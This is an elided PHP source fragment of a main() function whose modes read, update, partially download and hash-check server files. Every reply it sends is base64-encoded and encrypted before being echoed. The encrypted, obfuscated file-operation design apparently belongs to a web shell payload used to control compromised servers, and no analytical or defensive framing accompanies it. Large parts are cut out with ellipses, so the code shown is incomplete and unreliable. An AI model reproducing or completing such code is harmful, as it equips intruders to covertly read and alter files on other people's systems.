...
function main($mode, $path = ".", $hash = "", $blockIndex = "", $blockSize = "", $content = "", $charset = "", $newpath = "", $createTimeStamp = "", $accessTimeStamp = "", $modifyTimeStamp = "")
{
    ...
    switch ($mode) {
        ...
        case "show":
            ...
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode(base64_encode($contents));
            /*if (function_exists("mb_convert_encoding"))
            {
                if ($charset=="")
                {
            ...
            $result = encrypt(json_encode($result));
            echo $result;
            break;
        case "getTimeStamp":
            $result["status"] = base64_encode("success");
        ...
        case "update":
            ...
            if (sem_acquire($semRes)) { // try to acquire the semaphore. this function will block until the sem will be available
                ...
                sem_release($semRes);
                      ...
                      $result["msg"] = base64_encode($errObj["message"]);
                      echo encrypt(json_encode($result));
                      return;
                }
            ...
            case "downloadPart":
                ...
                fclose($f);
                $result["msg"] = base64_encode(base64_encode($data));
            $result["status"] = base64_encode("success");
            echo encrypt(json_encode($result));
                break;
        case "check":
            if ($hash == substr(md5_file($path), 0, 16)) {
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode("ok");
                @session_start();
                fclose($_SESSION["update." . $path]);
                unset($_SESSION["update." . $path]);
                session_write_close();
            } else {
                $result["status"] = base64_encode("fail");
                $result["msg"] = base64_encode("ok");
